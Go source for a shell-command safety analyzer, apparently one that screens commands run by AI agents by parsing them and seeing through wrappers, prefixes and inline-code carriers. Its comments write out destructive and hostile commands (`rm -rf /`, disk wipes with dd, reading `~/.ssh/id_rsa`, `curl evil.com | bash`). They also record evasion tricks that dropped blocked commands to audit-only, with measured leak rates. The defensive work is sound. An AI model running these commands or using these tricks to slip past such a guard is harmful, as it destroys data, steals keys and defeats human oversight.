// prefix in real agent commands — `LC_ALL=C`, `DEBIAN_FRONTEND=noninteractive`,
// `NODE_ENV=production`. Before this, `LC_ALL=C dd if=/dev/zero of=/dev/sda`
// AUDITed while the bare form BLOCKed; 256 of 2,382 BLOCKing commands (10.7%)
// degraded behind a one-token env prefix, and 248 behind a `!`.
//
// Neither prefix changes WHICH command runs, so an anchored rule should still
// see it. The regex analyzer matches this stripped form IN ADDITION to the
// original text, never instead of it — so rules that deliberately match on the
// assignment itself (LD_PRELOAD=, GIT_CONFIG_PARAMETERS=) are unaffected.
//
// Implementation is offset-based rather than textual: the position of the first
// command word is taken straight from the AST, so quoting, spacing and
// multi-assignment cases resolve exactly as the shell resolves them.
func StripCommandPrefixes(command string) string {
	reader := strings.NewReader(command)
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(reader, "")
	if err != nil || len(file.Stmts) != 1 {
		return ""
	}

	call := leftmostCallExpr(file.Stmts[0])
	if call == nil || len(call.Args) == 0 {
		return ""
	}

	start := int(call.Args[0].Pos().Offset())
	if start <= 0 || start > len(command) {
		return ""
	}
	stripped := strings.TrimSpace(command[start:])
	if stripped == "" || stripped == command {
		return ""
	}
	return stripped
}

// leftmostCallExpr descends to the first CallExpr that actually runs, so the
// head of a pipeline ("LC_ALL=C curl x | bash") is found rather than the whole
// BinaryCmd. Returns nil for statements with no plain command at the head.
func leftmostCallExpr(stmt *syntax.Stmt) *syntax.CallExpr {
	if stmt == nil {
		return nil
	}
	switch cmd := stmt.Cmd.(type) {
	case *syntax.CallExpr:
		return cmd
	case *syntax.BinaryCmd:
		return leftmostCallExpr(cmd.X)
	case *syntax.TimeClause:
		return leftmostCallExpr(cmd.Stmt)
	}
	return nil
}

// collectStmts walks a statement, recursing through the constructs that group
// multiple leaf commands (&&/||/| chains, subshells, `time`-wrapped statements
// and — since #3045 — every compound command), and appends each actual leaf
// *syntax.Stmt to out. Mirrors walkStmt's traversal shape but collects AST
// nodes (for position info) instead of building CommandSegment values.
//
// It is the shared traversal behind SplitTopLevelStatements
// (splitPipes=true) and SplitSequencedStatements (splitPipes=false). The flag
// has to be threaded through every recursive call rather than checked once at
// the top: a pipeline can be nested arbitrarily deep inside compound bodies
// (`{ a; b | c; }`), and the sequenced splitter must keep that inner pipeline
// whole too.
func collectStmts(stmt *syntax.Stmt, out *[]*syntax.Stmt, splitPipes bool) {
	switch cmd := stmt.Cmd.(type) {
	case *syntax.BinaryCmd:
		if !splitPipes && (cmd.Op == syntax.Pipe || cmd.Op == syntax.PipeAll) {
			*out = append(*out, stmt)
			return
		}
		collectStmts(cmd.X, out, splitPipes)
		collectStmts(cmd.Y, out, splitPipes)
	case *syntax.Subshell:
		for _, s := range cmd.Stmts {
			collectStmts(s, out, splitPipes)
		}
	case *syntax.TimeClause:
		if cmd.Stmt != nil {
			collectStmts(cmd.Stmt, out, splitPipes)
		}

	// Compound commands — must mirror walkStmt (issue #3045). Without these,
	// the "default" arm below emits the ENTIRE compound as a single leaf
	// statement, which silently defeats the per-statement intent scoping that
	// #2843 added: `{ cat ~/.ssh/id_rsa; git commit -m "notes"; }` collapses to
	// one statement, the classifier labels the whole thing doc-text because of
	// the trailing commit message, and the private-key read is downgraded from
	// BLOCK to AUDIT. That is the exact "unrelated dangerous statement chained
	// next to a doc-text-shaped one" bypass this function exists to prevent.
	case *syntax.Block:
		for _, s := range cmd.Stmts {
			collectStmts(s, out, splitPipes)
		}
	case *syntax.IfClause:
		for _, s := range cmd.Cond {
			collectStmts(s, out, splitPipes)
		}
		for _, s := range cmd.Then {
			collectStmts(s, out, splitPipes)
		}
		if cmd.Else != nil {
			collectStmts(&syntax.Stmt{Cmd: cmd.Else}, out, splitPipes)
		}
	case *syntax.WhileClause:
		for _, s := range cmd.Cond {
			collectStmts(s, out, splitPipes)
		}
		for _, s := range cmd.Do {
			collectStmts(s, out, splitPipes)
		}
	case *syntax.ForClause:
		for _, s := range cmd.Do {
			collectStmts(s, out, splitPipes)
		}
	case *syntax.CaseClause:
		for _, item := range cmd.Items {
			if item == nil {
				continue
			}
			for _, s := range item.Stmts {
				collectStmts(s, out, splitPipes)
			}
		}
	case *syntax.FuncDecl:
		if cmd.Body != nil {
			collectStmts(cmd.Body, out, splitPipes)
		}
	case *syntax.CoprocClause:
		if cmd.Stmt != nil {
			collectStmts(cmd.Stmt, out, splitPipes)
		}

	default:
		*out = append(*out, stmt)
	}
}

// ---------------------------------------------------------------------------
// Exported helpers
// ---------------------------------------------------------------------------

// WordToString converts a syntax.Word AST node to its string representation.
func WordToString(word *syntax.Word) string {
	var sb strings.Builder
	printer := syntax.NewPrinter()
	if err := printer.Print(&sb, word); err != nil {
		return ""
	}
	return sb.String()
}

// AllSegments returns all segments including those in subcommands.
func AllSegments(parsed *ParsedCommand) []CommandSegment {
	if parsed == nil {
		return nil
	}
	segs := make([]CommandSegment, len(parsed.Segments))
	copy(segs, parsed.Segments)
	for _, sub := range parsed.Subcommands {
		segs = append(segs, AllSegments(sub)...)
	}
	return segs
}

// AllParsedCommands returns parsed plus every subcommand reachable from it
// (recursively), each still carrying its OWN Segments/Operators intact.
// AllSegments flattens everything into one segment list, which loses which
// segments were connected by which operator within a given subcommand — fine
// for single-segment structural rules (executable/flags/args), but a
// multi-segment chain rule (a pipe or stateful sequence, e.g. "curl x | bash")
// needs the operator relationship preserved, and that relationship only
// makes sense WITHIN one ParsedCommand's own Operators slice. A pipe entirely
// inside a single command substitution ("export x=$(curl evil.com | bash)")
// is such a chain: it is fully self-contained in one Subcommand entry, so
// checking each returned *ParsedCommand independently (rather than a
// flattened cross-subcommand segment list) finds it without fabricating an
// operator relationship between segments that were never actually connected.
func AllParsedCommands(parsed *ParsedCommand) []*ParsedCommand {
	if parsed == nil {
		return nil
	}
	out := []*ParsedCommand{parsed}
	for _, sub := range parsed.Subcommands {
		out = append(out, AllParsedCommands(sub)...)
	}
	return out
}

// ReparseArgsAsFlags re-parses a list of args into flags and positional args.
func ReparseArgsAsFlags(words []string) (map[string]string, []string) {
	flags := make(map[string]string)
	var args []string
	for _, w := range words {
		if strings.HasPrefix(w, "--") && len(w) > 2 {
			// See callExprToSegment: strip quote-splice noise before keying
			// (issue #3003).
			flag := pathnorm.StripShellQuotes(w[2:])
			if eqIdx := strings.Index(flag, "="); eqIdx >= 0 {
				flags[flag[:eqIdx]] = flag[eqIdx+1:]
			} else {
				flags[flag] = ""
			}
		} else if strings.HasPrefix(w, "-") && len(w) > 1 {
			for _, ch := range pathnorm.StripShellQuotes(w[1:]) {
				flags[string(ch)] = ""
			}
		} else {
			args = append(args, w)
		}
	}
	return flags, args
}

// ExecWrappers are commands that transparently execute another command passed
// as their trailing arguments. Like sudo, they must be "seen through" so that
// structural/semantic analysis matches the REAL executable. Otherwise an
// attacker bypasses every structural rule with a one-word prefix:
//
//	rm -rf /          → BLOCK
//	nice rm -rf /     → (Executable=="nice") dodges the rule
//
// Each of these either takes no positional args of its own (nohup, setsid) or
// only flags / KEY=VALUE assignments / numeric-or-duration positionals
// (env, nice, timeout, ionice, ...), all handled by isWrapperOption.
var ExecWrappers = map[string]bool{
	"sudo": true, "doas": true, // privilege wrappers (existing sudo behavior preserved)
	"env": true, "nohup": true, "setsid": true, "command": true, "exec": true,
	"nice": true, "ionice": true, "stdbuf": true, "timeout": true,
	"chrt": true, "taskset": true, "time": true,
	"eatmydata": true, "proxychains": true, "proxychains4": true, "catchsegv": true,
	// Tracers and sandboxes: all take flags (and flag values) before the
	// target command, so isWrapperOption already describes their operands.
	"strace": true, "ltrace": true, "unbuffer": true, "firejail": true,
	"torsocks": true, "torify": true, "systemd-run": true,
	// macOS: `caffeinate -i CMD` and `arch -x86_64 CMD` are the local
	// equivalents of nohup/setsid and are just as transparent.
	"caffeinate": true, "arch": true,
	// Deliberately NOT wrappers:
	//   bwrap    — `--dev-bind / /` takes bare path operands after a flag, so
	//              the flag-only operand model would mis-target the first path
	//              as the command.
	//   flock    — takes a lockfile operand before the command, same problem.
	//   xargs    — builds its command line from stdin; not a static prefix.
	//   su       — `su -c 'CMD'` carries inline code, a different shape.
	//              This line claimed ExtractInlineCode handled it; for four
	//              months nothing did, and `su -c 'rm -rf /'` reached no layer
	//              that could decompose it (34.3% of the BLOCKing corpus,
	//              #3223). It is true now — see PrivilegeShellCarriers — but
	//              the lesson is that a comment delegating to another component
	//              is a claim, and claims need a test. TestSuInlineCodeParity
	//              is the one that would have caught it.
	//   runuser  — `runuser -u USER -- CMD`. isWrapperOption cannot know that
	//              `-u` consumes the NEXT token, so USER would be taken as the
	//              target command. Listing it would unwrap to the username
	//              instead of the command: no worse than today, but no better,
	//              and it would look covered when it is not. It stays covered
	//              by the dedicated pkexec/doas/runuser regex rules. Supporting
	//              it properly needs a per-wrapper value-taking-flag table or
	//              honouring the `--` end-of-options marker; tracked in #3057.
}

// isExecWrapper reports whether a command word names a transparent execution
// wrapper, resolving a path to the program it actually runs.
//
// The table is keyed on bare names and NormalizeExecName strips shell quoting
// but not the directory, so before #3057 `env` was recognized and
// `/usr/bin/env` was not — a one-token evasion of a defense that already knew
// the program, using the single most idiomatic way to invoke it (every shebang
// in existence writes it that way). `/bin/nice`, `/usr/bin/timeout` and the
// rest were the same. In the corpus sweep this cost 20.2% of BLOCKing commands
// versus 11.1% for the bare-name form.
//
// Only absolute and home-anchored paths are resolved. A relative `./env` is far
// more likely to be a project script that happens to share the name than the
// system tool, and treating it as a wrapper would shift analysis onto its
// argument.
func isExecWrapper(word string) bool {
	name := NormalizeExecName(word)
	if ExecWrappers[name] {
		return true
	}
	if strings.HasPrefix(name, "/") || strings.HasPrefix(name, "~/") {
		return ExecWrappers[path.Base(name)]
	}
	return false
}

var wrapperAssignRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)

// numeric, decimal, duration (5, 5s, 0.5, 1m), or hex mask (0x3) — the only
// positional argument shapes the wrappers accept before their target command.
// A real command name never matches these, so skipping them can never swallow
// the executable.
var wrapperNumArgRe = regexp.MustCompile(`^(0x[0-9a-fA-F]+|[0-9]+(\.[0-9]+)?[smhd]?)$`)

// NormalizeExecName strips the shell quoting/escaping that the shell collapses
// before resolving a command name, so obfuscated executables match their real
// name: "\rm", "\"rm\"", "'rm'", "r\"\"m", "rm”", "r\m" all → "rm".
//
// This defeats a standard alias-evasion / detection-evasion trick: `\rm`,
// `"rm"`, and friends all execute rm in a real shell, but a naive parser keeps
// the quotes/backslash in the token and the executable no longer equals "rm".
//
// Scoped to the executable position only: real command names never contain
// quote or backslash characters, so removing them here is safe. Args keep their
// original form (quotes/backslashes can be meaningful in arguments). Words that
// carry a dynamic expansion ($VAR, $(...), backticks) are returned unchanged —
// their runtime value can't be resolved statically.
func NormalizeExecName(s string) string {
	// Same shell quote/escape stripping as protected-path and argument-glob
	// matching — kept in pathnorm so all three surfaces collapse quotes
	// identically (issue #2813).
	return pathnorm.StripShellQuotes(s)
}

// isWrapperOption reports whether tok is an option/operand consumed by an exec
// wrapper (and therefore not the wrapped command itself).
func isWrapperOption(tok string) bool {
	if tok == "" {
		return false
	}
	if strings.HasPrefix(tok, "-") {
		return true
	}
	if wrapperAssignRe.MatchString(tok) {
		return true
	}
	return wrapperNumArgRe.MatchString(tok)
}

// StripExecWrappers peels off leading execution-wrapper commands (sudo, env,
// nice, timeout, ...) and their options, returning the words starting at the
// real target command. Handles nesting ("sudo nice rm", "nohup setsid rm").
// If a wrapper has no trailing command (e.g. bare "env", "env -i", "sudo -i"),
// the wrapper is left in place so it is still represented as the executable.
func StripExecWrappers(words []string) []string {
	// Need at least the wrapper plus one more token to unwrap.
	for len(words) > 1 {
		if !isExecWrapper(words[0]) {
			break
		}
		target := wrapperTargetIndex(words)
		if target >= len(words) {
			break // wrapper with no real target — keep it as the executable
		}
		words = words[target:]
	}
	return words
}

// StripExecWrapperPrefix returns the command text starting at the real target
// of any leading execution wrappers, or "" when there is no wrapper to peel.
//
//	"env dd if=/dev/zero of=/dev/sda"  ->  "dd if=/dev/zero of=/dev/sda"
//	"/usr/bin/env rm -rf /"            ->  "rm -rf /"
//	"sudo nice -n 19 rm -rf /"         ->  "rm -rf /"     (nesting)
//	"LC_ALL=C sudo dd if=/dev/zero"    ->  "dd if=/dev/zero"
//	"rm -rf /"                         ->  ""             (nothing to do)
//
// This is the regex layer's half of #3057. StripExecWrappers already gives the
// structural/semantic/dataflow analyzers a wrapper-transparent view, but the
// regex layer matches raw text and had no equivalent, which left a hard 11.1%
// floor: `^(sudo\s+)?dd\s+.*if=/dev/(zero|urandom)` is defeated by
// `env dd if=/dev/zero of=/dev/sda` no matter how well the AST layers see it.
//
// An exec wrapper is the same shape of prefix that #3048 handled for env
// assignments and `!` — it does not change WHICH command runs — so the caller
// matches this form IN ADDITION to the original text, never instead of it.
// Rules that deliberately key on the wrapper itself (the pkexec/doas/runuser
// privilege-escalation rules, `strace -p PID`) still see the raw command.
//
// Because it anchors at CallExpr.Args[0], which the parser places after any
// leading assignments and `!`, it composes with StripCommandPrefixes for free:
// the assignment case falls out without a second pass.
func StripExecWrapperPrefix(command string) string {
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(command), "")
	if err != nil || len(file.Stmts) != 1 {
		return ""
	}

	call := leftmostCallExpr(file.Stmts[0])
	if call == nil {
		return ""
	}

	// Walk wrappers the same way StripExecWrappers walks words, but tracking the
	// AST index so the ORIGINAL text (quoting, spacing) can be sliced out rather
	// than reconstructed. Both walks share wrapperTargetIndex so the regex
	// layer's view of a wrapper's operands can never drift from the AST layer's
	// — the drift #3221 was measuring in the first place.
	words := make([]string, len(call.Args))
	for i, a := range call.Args {
		words[i] = WordToString(a)
	}
	target := 0
	for target < len(call.Args)-1 {
		if !isExecWrapper(words[target]) {
			break
		}
		next := target + wrapperTargetIndex(words[target:])
		if next >= len(call.Args) {
			break // wrapper with no real target — leave it as the executable
		}
		target = next
	}
	if target == 0 {
		return ""
	}

	start := int(call.Args[target].Pos().Offset())
	if start <= 0 || start > len(command) {
		return ""
	}
	stripped := strings.TrimSpace(command[start:])
	if stripped == "" || stripped == command {
		return ""
	}
	return stripped
}

// CarriesShellSource reports whether seg delivers SHELL source to a shell, and
// is therefore worth decomposing and re-analysing with shell rules.
//
// This predicate used to be written out twice — once as the sub-parse gate in
// walkStmt, once inverted as the skip condition in InlineCodeFragments — and
// each new carrier class had to be added to both. #3223 measured what happens
// when only some surfaces learn about a carrier: teaching ExtractInlineCode
// about `su -c` alone left the payload undecomposed for structural and semantic
// rules and measured 12.6% against a 2.4% control, i.e. it read like a fix that
// had not worked. Collapsing the two copies into this one function means a new
// entry cannot reach one surface and miss the other.
//
// CodeInterpreters are deliberately NOT here even though ExtractInlineCode
// handles them: a `python3 -c` payload is Python, and matching shell rules
// against it re-creates the inert string-literal false positives of #1570/#2995.
func CarriesShellSource(seg CommandSegment) bool {
	return seg.IsShell ||
		seg.Executable == "eval" || seg.Executable == "trap" ||
		seg.ProcSubstLiteral != "" ||
		PrivilegeShellCarriers[seg.Executable] ||
		seg.SourceArg != ""
}

// ExtractInlineCode extracts the code argument from interpreters that accept
// inline code: bash -c 'code', python -c 'code', eval 'code', etc.
func ExtractInlineCode(seg CommandSegment) string {
	// eval is the most direct inline-code carrier there is: unlike an
	// interpreter, it takes no options, so every argument IS the source (#3059).
	if seg.Executable == "eval" {
		return evalCode(seg.Args)
	}
	if seg.Executable == "trap" {
		return trapCode(seg.Args)
	}
	// "source"/"." are shell builtins, not interpreter binaries — IsShell is
	// false for both — so this must be checked before the IsShell/
	// CodeInterpreters gate below or it would never be reached (#3190).
	if seg.ProcSubstLiteral != "" {
		return seg.ProcSubstLiteral
	}
	// `su -c 'CMD'` and `runuser -u USER -c 'CMD'` hand CMD to a shell exactly
	// the way `bash -c` does. Checked before the gate below for the same reason
	// source/. is: neither is IsShell nor a CodeInterpreter, so both would fall
	// through with the payload already parsed and sitting in CFlagArg (#3223).
	//
	// Only the -c shape. `su USER <<EOF` also feeds shell source over stdin, but
	// #3081 is the standing warning that two delivery mechanisms which look like
	// one bug class can behave nothing alike -- here-string leaked 0.1% where
	// heredoc leaked 26.4%. That form needs its own measurement, not an
	// assumption inherited from this one.
	if PrivilegeShellCarriers[seg.Executable] {
		if seg.CFlagArg != "" {
			return payloadValue(seg.CFlagArg)
		}
		return ""
	}
	// A shell-source carrier's flag value / trailing operand (#3232). Checked
	// before the IsShell/CodeInterpreters gate below for the same reason
	// source/. and the privilege carriers are: none of `man`, `flock`, `tar`,
	// `sort`, `watch` is a shell or an interpreter, so all of them would fall
	// through with the payload already captured and sitting unused in SourceArg.
	if seg.SourceArg != "" {
		return payloadValue(seg.SourceArg)
	}
	if !seg.IsShell && !CodeInterpreters[seg.Executable] {
		return ""
	}
	// CFlagArg is the positionally-captured payload (see its doc comment) —
	// preferred because it survives a value-taking flag before "-c"
	// ("bash -O expand_aliases -c 'code'") that shifts Args[0] away from the
	// real payload (#3059). Falls back to the Flags/Args pair for shapes
	// CFlagArg wasn't populated for (there is none left, but the fallback is
	// harmless and keeps this defensive against future callers).
	if seg.CFlagArg != "" {
		return payloadValue(seg.CFlagArg)
	}
	if _, hasC := seg.Flags["c"]; hasC {
		if len(seg.Args) > 0 {
			return payloadValue(seg.Args[0])
		}
	}
	// A heredoc body is shell source read via stdin instead of argv — the same
	// execution shape as -c, just a different delivery mechanism (#3081). Only
	// reached for seg.IsShell (HeredocBody is never populated for a
	// CodeInterpreters entry — see the InInterpreterHeredoc doc comment in
	// intent.go for why a non-shell interpreter's heredoc body must NOT be
	// treated as shell source).
	if seg.HeredocBody != "" {
		return seg.HeredocBody
	}
	// A here-string body is shell source read via stdin instead of argv — the
	// same execution shape as the heredoc case just above, just spelled with
	// `<<<` instead of `<<`/`<<-` (#3242). Only reached for seg.IsShell for
	// the same reason HeredocBody is.
	if seg.HereStringBody != "" {
		return seg.HereStringBody
	}
	return ""
}

// evalCode reconstructs the shell source `eval` would run. Bash's eval takes
// no options: every argument is literal shell source, individually dequoted
// (each argv entry is already one complete shell word) and rejoined with a
// single space, mirroring what eval itself does with its argv before
// re-parsing the result (#3059) — `eval 'rm' '-rf' '/'` and
// `eval 'rm -rf /'` and `eval rm -rf /` all reconstruct to "rm -rf /".
func evalCode(args []string) string {
	if len(args) == 0 {
		return ""
	}
	parts := make([]string, len(args))
	for i, a := range args {
		parts[i] = payloadValue(a)
	}
	return strings.Join(parts, " ")
}

// trapCode extracts the action argument from a `trap` invocation, the same
// deferred-execution shape as eval/-c/heredoc: the action string is shell
// source that runs later, outside the statement that defines it (on EXIT,
// ERR, DEBUG, RETURN, or a caught signal) — a natural place to smuggle a
// destructive command past reviewers who read the visible command stream and
// see only "trap ... EXIT" (#3084).
//
// Bash's syntax is `trap [-lp] [[arg] sigspec ...]`. arg is only the ACTION
// when at least one sigspec follows it — a single remaining word alone is a
// sigspec being reset to default (`trap INT`), not code, and `-l`/`-p` never
// carry an action (both land in seg.Flags, never seg.Args, so they don't
// affect this count). Requiring 2+ args keeps `trap -p` and `trap -l` from
// being misread as code. A bare `-` action (`trap - DEBUG`) is bash's reset
// placeholder, not code, so it is excluded too.
func trapCode(args []string) string {
	if len(args) < 2 {
		return ""
	}
	action := payloadValue(args[0])
	if action == "-" {
		return ""
	}
	return action
}

// InlineCodeFragments returns the code carried inside every `-c` interpreter
// invocation in a command, dequoted and ready to be matched or re-parsed.
//
//	"bash -c 'dd if=/dev/zero of=/dev/sda'"  ->  ["dd if=/dev/zero of=/dev/sda"]
//	"rm -rf /"                               ->  nil
//
// Fixing the parse (see unwrapOuterQuotes) lets the STRUCTURAL analyzer see
// inside `bash -c '...'`, but the regex layer still matches against text whose
// anchors see `bash -c ...`, so rules like `^(sudo\s+)?dd\s+.*if=/dev/(zero|…)`
// keep missing. Exposing the fragments lets the regex analyzer match them as
// additional candidates (#3050).
//
// SHELL sources only — deliberately NOT python/node/ruby, even though
// ExtractInlineCode handles those too. A `python3 -c` payload is Python source,
// not a shell command, so matching shell rules against it re-creates the inert
// string-literal false positives fixed in #1570, #1788 and #2995: a Python
// string that merely MENTIONS `~/.ssh/id_rsa` or `>> $GITHUB_PATH` is text
// being processed, not an access being performed. Analysing interpreter source
// needs the language-aware path, not shell regexes. eval's and trap's argument
// IS shell source (not a separate interpreter), so both belong on this side of
// the line too (#3059, #3084). A literal echo/printf process substitution fed
// to source/./a shell interpreter is shell source too — ProcSubstLiteral is
// only ever populated for that shell-only shape (#3190).
func InlineCodeFragments(command string) []string {
	parsed := Parse(command, 2)
	if parsed == nil {
		return nil
	}
	var out []string
	for _, seg := range parsed.Segments {
		if !CarriesShellSource(seg) {
			continue
		}
		if code := ExtractInlineCode(seg); code != "" {
			out = append(out, code)
		}
	}
	return out
}

// unwrapOuterQuotes removes ONE matched pair of surrounding quotes.
//
// Segment args come from WordToString, which prints via the syntax printer and
// therefore preserves quoting. Handing that text straight back to the parser
// re-parses `'rm -rf /'` as a single quoted word — one executable literally
// named "rm -rf /" — so every structural/semantic check keyed on
// Executable == "rm" missed, and `bash -c 'rm -rf /'` degraded from BLOCK to
// AUDIT while the bare command BLOCKed (issue #3050; 32% of BLOCKing commands
// leaked this way).
//
// Inner quoting is left untouched, so `bash -c 'echo "hi"'` still re-parses as
// `echo "hi"` rather than being flattened. Also handles the $'...' ANSI-C form.
//
// This is the FALLBACK now, not the primary path — payloadValue calls it only
// for a word it cannot resolve statically (#3241). It is kept rather than
// inlined because that residue is real: a payload carrying a ParamExp or a
// CmdSubst has no statically-knowable value, and stripping its outer quotes is
// still the right approximation.
//
// One correction to what this comment used to claim: it said only a MATCHED
// outer pair is removed. First-char/last-char equality is not matching, and on
// `'rm'\ '-rf'\ '/'` it takes one quote from each of two DIFFERENT spans and
// emits the corrupted `rm'\ '-rf'\ '/`. That shape now resolves through
// payloadValue instead, so the wrong answer here is no longer reachable for it
// — but do not read this function as doing more than it does.
func unwrapOuterQuotes(s string) string {
	if strings.HasPrefix(s, "$'") && strings.HasSuffix(s, "'") && len(s) >= 3 {
		return s[2 : len(s)-1]
	}
	if len(s) >= 2 {
		if q := s[0]; (q == '\'' || q == '"') && s[len(s)-1] == q {
			return s[1 : len(s)-1]
		}
	}
	return s
}

// HasFlag checks if a flag key exists in the flags map.
func HasFlag(flags map[string]string, key string) bool {
	_, ok := flags[key]
	return ok
}

// ---------------------------------------------------------------------------
// Predicate helpers
// ---------------------------------------------------------------------------

var ShellInterpreters = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true,
	"ksh": true, "fish": true, "csh": true, "tcsh": true,
}

var CodeInterpreters = map[string]bool{
	"python": true, "python3": true, "python2": true,
	"node": true, "ruby": true, "perl": true, "lua": true,
	"php": true,
}

// PrivilegeShellCarriers are privilege-switching programs whose `-c` argument
// is shell source, run by the target user's shell (issue #3223).
//
// They are neither shell binaries (IsShell) nor code interpreters
// (CodeInterpreters), which is precisely why they were missed. The ExecWrappers
// table excludes `su` on the grounds that `su -c 'CMD'` "carries inline code, a
// different shape (see ExtractInlineCode / InlineCodeFragments)" -- and
// ExtractInlineCode did not handle it either. The comment described a division
// of labour that neither side implemented, so `su -c 'rm -rf /'` reached no
// layer that could decompose it. Documented is not enforced.
//
// The parser was already doing the hard part: parseSegment captures the -c
// payload into CFlagArg for every spelling -- `su -c 'CMD'`, `su root -c 'CMD'`,
// `su - root -c 'CMD'`, `su -l root -c 'CMD'`, `runuser -u root -c 'CMD'` --
// so a single gate was discarding a fully-parsed payload.
var PrivilegeShellCarriers = map[string]bool{
	"su": true, "runuser": true,
}

func IsShellInterpreter(exe string) bool {
	return ShellInterpreters[exe]
}

func IsShellOrInterpreter(exe string) bool {
	return ShellInterpreters[exe] || CodeInterpreters[exe]
}

func IsDownloadCommand(exe string) bool {
	switch exe {
	case "curl", "wget", "fetch", "aria2c":
		return true
	}
	return false
}

func IsDangerousPipeTarget(exe string) bool {
	switch exe {
	case "crontab", "at", "tee", "dd", "mysql", "psql", "sqlite3":
		return true
	}
	return false
}

func IsSubcommandTool(exe string) bool {
	switch exe {
	case "npm", "pip", "pip3", "yarn", "pnpm", "cargo", "go",
		"git", "docker", "kubectl", "brew", "apt", "apt-get",
		"systemctl", "service", "gh",
		"terraform", "tofu", "terragrunt", "pulumi", "cdk", "helm":
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

func redirectOpString(redir *syntax.Redirect) string {
	switch redir.Op {
	case syntax.RdrOut:
		return ">"
	case syntax.AppOut:
		return ">>"
	case syntax.RdrIn:
		return "<"
	default:
		return redir.Op.String()
	}
}

func binaryOpString(op syntax.BinCmdOperator) string {
	switch op {
	case syntax.Pipe:
		return "|"
	case syntax.AndStmt:
		return "&&"
	case syntax.OrStmt:
		return "||"
	default:
		return op.String()
	}
}
